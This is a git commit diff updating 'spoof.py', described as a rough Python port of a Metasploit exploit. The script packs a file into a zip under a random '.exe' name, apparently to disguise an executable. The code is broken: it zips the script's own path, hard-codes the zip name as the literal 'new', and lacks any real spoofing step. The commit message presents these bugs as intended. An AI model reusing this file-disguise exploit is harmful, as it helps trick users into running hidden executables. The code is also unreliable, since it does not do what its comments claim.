c6ee2ccc5dab1569a94424da4b7d7a4ba3429f59
thezilla <321homerepair@gmail.com>
2014-04-16 18:52:13 -0400

    Update spoof.py
    Updates after some testing... as of now naming new file to new instead of generated name.

--- spoof.py
+++ spoof.py
@@ -6,16 +6,16 @@ import zipfile
 My poor attempt @ porting a msf exploit to python. - http://www.exploit-db.com/exploits/32752/
 
 Run with:
-    python spoof.py file_to_spoof new_spoofed_filename
+python spoof.py file_to_spoof new_spoofed_filename
 """
+
 file = sys.argv[0]
-newfile = sys.argv[1]
+new = ''.join(random.choice('0123456789abcdefghijklmnopqurstuvwxyz') for i in range(16)) + ".exe"
 
-def spoof_file(file, newfile):
-    new_filename = ''.join(random.choice('0123456789abcdefghijklmnopqurstuvwxyz') for i in range(16)) + ".exe"
-    zip = zipfile.ZipFile('new_filename', 'w')
-    zip.write(new_filename)
+def spoof_file(file, new):
+    zip = zipfile.ZipFile('new', 'w')
+    zip.write(file)
     zip.close()
-    print "Created file: " + new_filename
+    print "Created file: " + new
 
-spoof_file()
+spoof_file(file, new)
